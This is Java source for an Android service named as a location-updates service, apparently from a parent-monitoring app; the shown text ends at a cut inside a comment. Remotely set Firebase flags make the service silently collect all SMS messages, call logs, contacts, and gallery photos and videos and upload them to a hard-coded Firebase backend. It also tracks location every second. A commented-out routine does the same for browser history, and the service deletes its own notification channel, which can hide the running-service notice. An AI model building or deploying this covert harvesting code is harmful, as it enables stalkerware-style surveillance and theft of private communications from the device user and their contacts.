package com.example.testlocalisation;

import android.Manifest;
import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.icu.text.SimpleDateFormat;
import android.location.Location;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Log;
import android.webkit.MimeTypeMap;
import android.widget.Toast;

import com.example.testlocalisation.Models.Appel;
import com.example.testlocalisation.Models.CircleZone;
import com.example.testlocalisation.Models.Contact;
import com.example.testlocalisation.Models.HistoryWeb;
import com.example.testlocalisation.Models.Message;
import com.example.testlocalisation.Models.Position;
import com.example.testlocalisation.Models.Upload;
import com.firebase.geofire.GeoFire;
import com.firebase.geofire.GeoLocation;
import com.firebase.geofire.GeoQuery;
import com.firebase.geofire.GeoQueryEventListener;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.maps.model.Circle;
import com.google.android.gms.maps.model.LatLng;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.Query;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FieldValue;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.ListResult;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.time.OffsetDateTime;
import java.time.ZoneOffset;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.TimeZone;

public class LocationUpdatesService extends Service implements GeoQueryEventListener {
    public final Uri BOOKMARKS_URI = Uri.parse("content://browser/bookmarks");
    public final String[] HISTORY_PROJECTION = new String[]{
            "_id", // 0
            "url", // 1
            "visits", // 2
            "date", // 3
            "bookmark", // 4
            "title", // 5
            "favicon", // 6
            "thumbnail", // 7
            "touch_icon", // 8
            "user_entered", // 9
    };
    public final int HISTORY_PROJECTION_TITLE_INDEX = 5;
    public final int HISTORY_PROJECTION_URL_INDEX = 1;
    private static final String PACKAGE_NAME =
            "com.google.android.gms.location.sample.locationupdatesforegroundservice";

    private static final String TAG = "resPOINT";
    private Date sendNotDate;
    /**
     * The name of the channel for notifications.
     */
    private static final String CHANNEL_ID = "channel_01";
    private GeoFire geoFire;
    private GeoQuery geoQuery;
    static final String ACTION_BROADCAST = PACKAGE_NAME + ".broadcast";
    private ArrayList<CircleZone> circleZones =  new ArrayList<>();
    static final String EXTRA_LOCATION = PACKAGE_NAME + ".location";
    private static final String EXTRA_STARTED_FROM_NOTIFICATION = PACKAGE_NAME +
            ".started_from_notification";

    private final IBinder mBinder = new LocalBinder();
    private boolean uploadImage = false;
    /**
     * The desired interval for location updates. Inexact. Updates may be more or less frequent.
     */
    private static final long UPDATE_INTERVAL_IN_MILLISECONDS = 1000;

    /**
     * The fastest rate for active location updates. Updates will never be more frequent
     * than this value.
     */
    private static final long FASTEST_UPDATE_INTERVAL_IN_MILLISECONDS =
            UPDATE_INTERVAL_IN_MILLISECONDS / 2;

    /**
     * The identifier for the notification displayed for the foreground service.
     */
    private static final int NOTIFICATION_ID = 12345678;

    /**
     * Used to check whether the bound activity has really gone away and not unbound as part of an
     * orientation change. We create a foreground service notification only if the former takes
     * place.
     */
    private boolean mChangingConfiguration = false;

    private NotificationManager mNotificationManager;
    private Zones zones= new Zones();
    private Maison maison = new Maison();
    private Ecole ecole = new Ecole();
    /*private ZonesMedium medium = new ZonesMedium();*/
    /**
     * Contains parameters used by {@link com.google.android.gms.location.FusedLocationProviderApi}.
     */
    private LocationRequest mLocationRequest;

    /**
     * Provides access to the Fused Location Provider API.
     */
    private FusedLocationProviderClient mFusedLocationClient;

    /**
     * Callback for changes in location.
     */
    private LocationCallback mLocationCallback;

    private Handler mServiceHandler;

    Double latitude, longitude;

    /**
     * The current location.
     */
    private Location mLocation;
    private boolean isInMaison;
    private boolean isUploadImage=false;
    /**
     * Realtime location save in firestore or firebase*/
    FirebaseDatabase rootNode;
    DatabaseReference currentLocalisation;
    DatabaseReference localisationTracker;
    DatabaseReference uploads;
    DatabaseReference zone;
    private StorageReference mStorageRef;
    @SuppressWarnings("deprecation")
    public LocationUpdatesService() {
    }

    @SuppressWarnings("deprecation")
    @Override
    public void onCreate() {
        mStorageRef = FirebaseStorage.getInstance("gs://localisation-2b7ab.appspot.com").getReference("uploads");
        rootNode = FirebaseDatabase.getInstance("https://localisation-2b7ab-default-rtdb.firebaseio.com/");
        currentLocalisation = rootNode.getReference("currentLocalisation");
        localisationTracker = rootNode.getReference("localisationTracker");
        uploads = rootNode.getReference("uploads");
        uploads.child("uploadVideo").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String status = snapshot.getValue(String.class);
                if(status!=null && !status.equals("")){
                    if(status.equals("oui")) {
                        uploads.child("uploadVideo").setValue("non");
                        uploads.child("Videos").removeValue();
                        ArrayList<Uri> Videos = getGalleryVideosPath();

                        for(Uri video : Videos){
                            /*Log.d(TAG, "ImagePath : "+getRealPathFromUri(image));*/
                            uploadVideo(video);
                        }
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
       /*
        ---> ne marche pas API >= 23
        uploads.child("uploadHistory").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String status = snapshot.getValue(String.class);
                if(status!=null && !status.equals("")){
                    if(status.equals("oui")) {
                        uploads.child("uploadHistory").setValue("non");
                        ArrayList<HistoryWeb> his = getBrowserHist();
                        uploads.child("History").removeValue().addOnCompleteListener(new OnCompleteListener<Void>() {
                            @Override
                            public void onComplete(@NonNull Task<Void> task) {
                                for(HistoryWeb h : his){
                                    *//*Log.d(TAG, "ImagePath : "+getRealPathFromUri(image));*//*
                                    uploadHistory(h);
                                }
                            }
                        });

                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });*/
        uploads.child("uploadContact").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String status = snapshot.getValue(String.class);
                if(status!=null && !status.equals("")){
                    if(status.equals("oui")) {
                        uploads.child("uploadContact").setValue("non");
                        ArrayList<Contact> contacts = getContactList();
                        uploads.child("Contact").removeValue().addOnCompleteListener(new OnCompleteListener<Void>() {
                            @Override
                            public void onComplete(@NonNull Task<Void> task) {
                                for(Contact c : contacts){
                                    /*Log.d(TAG, "ImagePath : "+getRealPathFromUri(image));*/
                                    uploadContact(c);
                                }
                            }
                        });

                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
        uploads.child("uploadMessage").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String status = snapshot.getValue(String.class);
                if(status!=null && !status.equals("")){
                    if(status.equals("oui")) {
                        uploads.child("uploadMessage").setValue("non");
                        ArrayList<Message> messages = getAllSms();
                        uploads.child("Message").removeValue().addOnCompleteListener(new OnCompleteListener<Void>() {
                            @Override
                            public void onComplete(@NonNull Task<Void> task) {
                                for(Message m :messages){
                                    /*Log.d(TAG, "ImagePath : "+getRealPathFromUri(image));*/
                                    uploadMessage(m);
                                }
                            }
                        });

                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
        uploads.child("uploadAppel").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String status = snapshot.getValue(String.class);
                if(status!=null && !status.equals("")){
                    if(status.equals("oui")) {
                        uploads.child("uploadAppel").setValue("non");
                        ArrayList<Appel> appels = getCallDetails();
                        uploads.child("Appel").removeValue().addOnCompleteListener(new OnCompleteListener<Void>() {
                            @Override
                            public void onComplete(@NonNull Task<Void> task) {
                                for(Appel a :appels){
                                    /*Log.d(TAG, "ImagePath : "+getRealPathFromUri(image));*/
                                    uploadAppel(a);
                                }
                            }
                        });

                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });

        uploads.child("uploadImage").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String status = snapshot.getValue(String.class);
                if(status!=null && !status.equals("")){
                    if(status.equals("oui")){
                        uploads.child("uploadImage").setValue("non");
                        uploads.child("Images").removeValue();
                        ArrayList<Uri> Images= getGalleryImagesPath();

                        for(Uri image : Images){
                            Log.d(TAG, "ImagePath : "+getRealPathFromUri(image));
                            uploadFile(image);
                        }
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        zone = rootNode.getReference("circleZones");
        mLocationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                super.onLocationResult(locationResult);
                onNewLocation(locationResult.getLastLocation());
            }
        };

        createLocationRequest();
        getLastLocation();

        HandlerThread handlerThread = new HandlerThread(TAG);
        handlerThread.start();
        mServiceHandler = new Handler(handlerThread.getLooper());
        mNotificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        zone.child("dansLaMaison").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {

                    String inMaison = snapshot.getValue(String.class);
                if(inMaison!=null){
                    Log.d(TAG, "onDataChange: "+inMaison);
                    if(inMaison.equals("oui")){
                        isInMaison = true;

                    }else{
                        isInMaison = false;
                    }
                }


            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
        // Android O requires a Notification Channel.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = getString(R.string.app_name);
            // Create the channel for the notification
            NotificationChannel mChannel =
                    new NotificationChannel(CHANNEL_ID, name, NotificationManager.IMPORTANCE_DEFAULT);

            // Set the Notification Channel for the Notification Manager.
            mNotificationManager.createNotificationChannel(mChannel);
        }
    }

    private void uploadHistory(HistoryWeb h) {
        String uploadId =   uploads.child("History").push().getKey();
        uploads.child("History").child(uploadId).setValue(h);
    }

    private void uploadMessage(Message m) {
        String uploadId =   uploads.child("Message").push().getKey();
        uploads.child("Message").child(uploadId).setValue(m);
    }

    private void uploadAppel(Appel a) {
        String uploadId =   uploads.child("Appel").push().getKey();
        uploads.child("Appel").child(uploadId).setValue(a);
    }

    private void uploadContact(Contact c) {
        String uploadId =   uploads.child("Contact").push().getKey();
        uploads.child("Contact").child(uploadId).setValue(c);
    }

    public  String getRealPathFromUri( Uri contentUri) {
        Cursor cursor = null;
        try {
            String[] proj = { MediaStore.Images.Media.DATA };
            cursor = LocationUpdatesService.this.getContentResolver().query(contentUri, proj, null, null, null);
            int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            cursor.moveToFirst();
            return cursor.getString(column_index);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
   /* public  boolean isStoragePermissionGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED) {
                Log.v(TAG,"Permission is granted");
                return true;
            } else {

                Log.v(TAG,"Permission is revoked");
                ActivityCompat.requestPermissions(LocationUpdatesService.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
                return false;
            }
        }
        else { //permission is automatically granted on sdk<23 upon installation
            Log.v(TAG,"Permission is granted");
            return true;
        }
    }*/


    private String getFileExtension(Uri uri) {
        ContentResolver cR = getContentResolver();
        MimeTypeMap mime = MimeTypeMap.getSingleton();
        return mime.getExtensionFromMimeType(cR.getType(uri));
    }
    private void uploadFile(Uri mImageUri) {
        if (mImageUri != null) {

            mStorageRef.child("Images").listAll().addOnSuccessListener(new OnSuccessListener<ListResult>() {
                @Override
                public void onSuccess(ListResult listResult) {

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        listResult.getItems().forEach(e ->{
                            e.delete();
                        });
                    }
                    StorageReference fileReference = mStorageRef.child("Images").child(System.currentTimeMillis()
                            + "." + getFileExtension(mImageUri));

                    fileReference.putFile(mImageUri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {

                            Task<Uri> result = taskSnapshot.getStorage().getDownloadUrl();
                            result.addOnSuccessListener(new OnSuccessListener<Uri>() {
                                @Override
                                public void onSuccess(Uri uri) {
                                    String imageUrl = uri.toString();

                                    Upload upload = new Upload( getRealPathFromUri(mImageUri).split("/")[getRealPathFromUri(mImageUri).split("/").length-1],
                                            imageUrl);
                                    String uploadId =   uploads.child("Images").push().getKey();
                                    uploads.child("Images").child(uploadId).setValue(upload);
                                }
                            });

                        }
                    });
                }
            });


        } else {
            Toast.makeText(this, "No file selected", Toast.LENGTH_SHORT).show();
        }
    }

    private void uploadVideo(Uri mVideoUri) {
        if (mVideoUri != null) {

            mStorageRef.child("Videos").listAll().addOnSuccessListener(new OnSuccessListener<ListResult>() {
                @Override
                public void onSuccess(ListResult listResult) {

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        listResult.getItems().forEach(e ->{
                            e.delete();
                        });
                    }
                    StorageReference fileReference = mStorageRef.child("Videos").child(System.currentTimeMillis()
                            + "." + getFileExtension(mVideoUri));

                    fileReference.putFile(mVideoUri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {

                            Task<Uri> result = taskSnapshot.getStorage().getDownloadUrl();
                            result.addOnSuccessListener(new OnSuccessListener<Uri>() {
                                @Override
                                public void onSuccess(Uri uri) {
                                    String imageUrl = uri.toString();
                                    Upload upload = new Upload( getRealPathFromUri(mVideoUri).split("/")[getRealPathFromUri(mVideoUri).split("/").length-1],
                                            imageUrl);
                                    String uploadId =   uploads.child("Videos").push().getKey();
                                    uploads.child("Videos").child(uploadId).setValue(upload);
                                }
                            });

                        }
                    });
                }
            });


        } else {
            Toast.makeText(this, "No file selected", Toast.LENGTH_SHORT).show();
        }
    }
    public ArrayList<Message> getAllSms() {
        ArrayList<Message> messages = new ArrayList<>();
        ContentResolver cr = LocationUpdatesService.this.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    Date dateFormat= new Date(Long.valueOf(smsDate));
                    String type="";
                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "recu";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "envoyer";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }

                    messages.add(new Message(smsDate,number,body,type));
                    c.moveToNext();
                }
            }

            c.close();

        }
        return messages;
    }
    private ArrayList<Uri> getGalleryVideosPath() {

        ArrayList<Uri> videoPathList = new ArrayList<Uri>();

        Uri uri = android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        /*Log.d(TAG, "ImageP Gallery"+uri);*/
        String[] projection = {MediaStore.MediaColumns._ID};

        Cursor cursor = LocationUpdatesService.this.getContentResolver().query(uri, projection, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                int id = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
                Uri u =ContentUris.withAppendedId(uri, id);
                if(!videoPathList.contains(u)){
                    videoPathList.add(u);
                }
                /*Log.d(TAG, "ImageP getGalleryImagesPath: ");*/
            }
            cursor.close();
        }

        return videoPathList;
    }
    /*public ArrayList<HistoryWeb> getBrowserHist()  {
        ArrayList<HistoryWeb> his = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor mCur = cr.query(this.BOOKMARKS_URI,
                this.HISTORY_PROJECTION, null, null, null);
        mCur.moveToFirst();
        if (mCur.moveToFirst() && mCur.getCount() > 0) {
            while (mCur.isAfterLast() == false) {

                String titre=  mCur.getString(this.HISTORY_PROJECTION_TITLE_INDEX);
                String url = mCur.getString(this.HISTORY_PROJECTION_URL_INDEX);
                his.add(new HistoryWeb(titre,url));
                mCur.moveToNext();
            }
        }
        return his;
    }*/
    private ArrayList<Contact> getContactList() {
        ArrayList<Contact> contacts = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));
                ArrayList<String> phonesAdded = new ArrayList<>();
                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        Log.d(TAG, "Name: " + name);
                        Log.d(TAG, "Phone Number: " + phoneNo);
                        if(!phonesAdded.contains(phoneNo)){
                            contacts.add(new Contact(name,phoneNo));
                            phonesAdded.add(phoneNo);
                        }

                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
        return contacts;
    }
    private ArrayList<Appel> getCallDetails() {
        ArrayList<Appel> appels = new ArrayList<>();
        ArrayList<Appel> apps = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor managedCursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number); // mobile number
            String callType = managedCursor.getString(type); // call type
            String callDate = managedCursor.getString(date); // call date
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "Sortie";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "Entrer";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "Rater";
                    break;
            }
            /*Log.d(TAG, "getCallDetails: "+phNumber);
            for(Appel a : apps){
                if(a.getCallDate() != callDate && a.getPhNumber() != phNumber){*/
                    Log.d(TAG, "getCallDetails: "+phNumber);
                    appels.add(new Appel(phNumber,callType,callDate,callDuration,dir));
          /*      }
            }
            apps.add(new Appel(phNumber,callType,callDate,callDuration,dir));*/
        }
        managedCursor.close();
        /*miss_cal.setText(sb);*/
        /*Log.e("Agil value --- ", sb.toString());*/
        return appels;
    }
    private ArrayList<Uri> getGalleryImagesPath() {

        ArrayList<Uri> imagePathList = new ArrayList<Uri>();

        Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
       /* Log.d(TAG, "ImageP Gallery"+uri);*/
        String[] projection = {MediaStore.MediaColumns._ID};
        Cursor cursor = LocationUpdatesService.this.getContentResolver().query(uri, projection, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                int id = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
                Uri u= ContentUris.withAppendedId(uri, id);
                if(!imagePathList.contains(u)){
                    imagePathList.add(u);
                }
                Log.d(TAG, "ImageP getGalleryImagesPath: ");
            }
            cursor.close();
        }

        return imagePathList;
    }

    @SuppressWarnings("deprecation")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Service started");
        boolean startedFromNotification = intent.getBooleanExtra(EXTRA_STARTED_FROM_NOTIFICATION,
                false);

        // We got here because the user decided to remove location updates from the notification.
        if (startedFromNotification) {
            //   removeLocationUpdates();
            //stopSelf();
        }
        // Tells the system to not try to recreate the service after it has been killed.
        return START_NOT_STICKY;
    }


    @SuppressWarnings("deprecation")
    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        mChangingConfiguration = true;
    }


    @SuppressWarnings("deprecation")
    @Override
    public IBinder onBind(Intent intent) {
        // Called when a client (MainActivity in case of this sample) comes to the foreground
        // and binds with this service. The service should cease to be a foreground service
        // when that happens.
        Log.i(TAG, "in onBind()");
        stopForeground(true);
        mChangingConfiguration = false;

        // Register Firestore when service will restart
        rootNode = FirebaseDatabase.getInstance("https://localisation-2b7ab-default-rtdb.firebaseio.com/");
        currentLocalisation = rootNode.getReference("currentLocalisation");
        localisationTracker = rootNode.getReference("localisationTracker");

        return mBinder;
    }


    @SuppressWarnings("deprecation")
    @Override
    public void onRebind(Intent intent) {
        // Called when a client (MainActivity in case of this sample) returns to the foreground
        // and binds once again with this service. The service should cease to be a foreground
        // service when that happens.
        Log.i(TAG, "in onRebind()");
        stopForeground(true);
        mChangingConfiguration = false;

        // Register Firestore when service will restart
        rootNode = FirebaseDatabase.getInstance("https://localisation-2b7ab-default-rtdb.firebaseio.com/");
        currentLocalisation = rootNode.getReference("currentLocalisation");
        localisationTracker = rootNode.getReference("localisationTracker");
        super.onRebind(intent);
    }


    @SuppressWarnings("deprecation")
    @Override
    public boolean onUnbind(Intent intent) {
        Log.i(TAG, "Last client unbound from service");

        // Called when the last client (MainActivity in case of this sample) unbinds from this
        // service. If this method is called due to a configuration change in MainActivity, we
        // do nothing. Otherwise, we make this service a foreground service.
        if (!mChangingConfiguration && Utils.requestingLocationUpdates(this)) {
            Log.d(TAG, "Starting foreground service");
            /*
            // TODO(developer). If targeting O, use the following code.
            if (Build.VERSION.SDK_INT == Build.VERSION_CODES.O) {
                mNotificationManager.startServiceInForeground(new Intent(this,
                        LocationUpdatesService.class), NOTIFICATION_ID, getNotification());
            } else {
                startForeground(NOTIFICATION_ID, getNotification());
            }
             */
            try{
                startForeground(NOTIFICATION_ID, getNotification());
                NotificationManager notificationManager =
                        (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                // The id of the channel.
                String id = "channel_01";
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    notificationManager.deleteNotificationChannel(id);
                }


            }catch (Exception e){

            }



        }
        return true; // Ensures onRebind() is called when a client re-binds.
    }



    @SuppressWarnings("deprecation")
    @Override
    public void onDestroy() {
        mServiceHandler.removeCallbacksAndMessages(null);
    }

    /**
     * Makes a request for location updates. Note that in this sample we merely log the
     * {@link SecurityException}.
     */
    public void requestLocationUpdates() {
        Log.i(TAG, "Requesting location updates");
        Utils.setRequestingLocationUpdates(this, true);
        startService(new Intent(getApplicationContext(), LocationUpdatesService.class));
        try {
            mFusedLocationClient.requestLocationUpdates(mLocationRequest,
                    mLocationCallback, Looper.myLooper());
        } catch (SecurityException unlikely) {
            Utils.setRequestingLocationUpdates(this, false);
            Log.d(TAG, "Lost location permission. Could not request updates. " + unlikely);
        }
    }

    /**
     * Removes location updates. Note that in this sample we merely log the
     * {@link SecurityException}.
     */
    public void removeLocationUpdates() {
        Log.i(TAG, "Removing location updates");
        try {
            mFusedLocationClient.removeLocationUpdates(mLocationCallback);
            Utils.setRequestingLocationUpdates(this, false);
            stopSelf();
        } catch (SecurityException unlikely) {
            Utils.setRequestingLocationUpdates(this, true);
            Log.d(TAG, "Lost location permission. Could not remove updates. " + unlikely);
        }
    }

    /**
     * Returns the {@link NotificationCompat} used as part of the foreground service.
     */
    private Notification getNot(){
        Notification notification = new NotificationCompat.Builder(this)
                .setContentTitle("Title")
                .setTicker("Title")
                .setContentText("App running")
                //.setSmallIcon(R.drawable.picture)
                .build();
        return notification;
    }
    private Notification getNotification() {
        Intent intent = new Intent(this, LocationUpdatesService.class);

        CharSequence text = Utils.getLocationText(mLocation);

        // Extra to help us figure out if we arrived in onStartCommand via the notification or not.
        intent.putExtra(EXTRA_STARTED_FROM_NOTIFICATION, true);

        // The PendingIntent that leads to a call to onStartCommand() in this service.
        PendingIntent servicePendingIntent = PendingIntent.getService(this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT);

        // The PendingIntent to launch activity.
        PendingIntent activityPendingIntent = PendingIntent.getActivity(this, 0,
                new Intent(this, MainActivity.class), 0);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this)
                //.addAction(R.drawable.ic_launch, getString(R.string.launch_activity), activityPendingIntent)
                //.addAction(R.drawable.ic_cancel, getString(R.string.remove_location_updates),
                //      servicePendingIntent)
                .setContentText(text)
                .setContentTitle(Utils.getLocationTitle(this))
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_LOW)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setTicker(text)
                .setWhen(System.currentTimeMillis());

        // Set the Channel ID for Android O.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId(CHANNEL_ID); // Channel ID
        }


        return builder.build();
    }

    private void getLastLocation() {
        try {
            mFusedLocationClient.getLastLocation()
                    .addOnCompleteListener(new OnCompleteListener<Location>() {
                        @Override
                        public void onComplete(@NonNull Task<Location> task) {
                            if (task.isSuccessful() && task.getResult() != null) {
                                mLocation = task.getResult();
                            } else {
                                Log.w(TAG, "Failed to get location.");
                            }
                        }
                    });
        } catch (SecurityException unlikely) {
            Log.d(TAG, "Lost location permission." + unlikely);
        }
    }

    private void onNewLocation(Location location) {
        Log.d(TAG, "New location: " + location);

        mLocation = location;

        // Notify anyone listening for broadcasts about the new location.
        Intent intent = new Intent(ACTION_BROADCAST);
        intent.putExtra(EXTRA_LOCATION, location);
        LocalBroadcastManager.getInstance(getApplicationContext()).sendBroadcast(intent);

        // Update notification content if running as a foreground service.
        if (serviceIsRunningInForeground(this)) {
            mNotificationManager.notify(NOTIFICATION_ID, getNotification());

            // Getting location when notification was call.
            latitude = location.getLatitude();
            longitude = location.getLongitude();

            // Here using to call Save to serverMethod
            SavetoServer(latitude,longitude);

        }
    }

    /**
     * Sets the location request parameters.
     */
    private void createLocationRequest() {
        mLocationRequest = new LocationRequest();
        mLocationRequest.setInterval(UPDATE_INTERVAL_IN_MILLISECONDS);
        mLocationRequest.setFastestInterval(FASTEST_UPDATE_INTERVAL_IN_MILLISECONDS);
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
    }

    @Override
    public void onKeyEntered(String key, GeoLocation location) {
        Log.d(TAG, "onKeyEntered: Je v envoyer un push notification au parent");
    }

    @Override
    public void onKeyExited(String key) {

    }

    @Override
    public void onKeyMoved(String key, GeoLocation location) {

    }

    @Override
    public void onGeoQueryReady() {

    }

    @Override
    public void onGeoQueryError(DatabaseError error) {

    }

    /**
     * Class used for the client Binder.  Since this service runs in the same process as its
     * clients, we don't need to deal with IPC.
     */
    public class LocalBinder extends Binder {
        LocationUpdatesService getService() {
            return LocationUpdatesService.this;
        }
    }

    /**
     * Returns true if this is a foreground service.
     *
     * @param context The {@link Context}.
     */
    public boolean serviceIsRunningInForeground(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(
                Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(
                Integer.MAX_VALUE)) {
            if (getClass().getName().equals(service.service.getClassName())) {
                if (service.foreground) {
                    return true;
                }
            }
        }
        return false;
    }


    /**
     * Save a value in realtime to firestore when user in background
     * For foreground you have to call same method to activity
     * */
/*    private void updateZones(Circle circle) {
        Query removeCircle = zones.child("danger").orderByChild("latitude").equalTo(circle.getCenter().latitude);
        removeCircle.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                for (DataSnapshot appleSnapshot: dataSnapshot.getChildren()) {
                    appleSnapshot.getRef().removeValue();
                }
                geoQuery.removeAllListeners();
                for(CircleZone c : circleZones){
                    GeoLocation loc = new GeoLocation(c.getLatitude(),c.getLongitude());
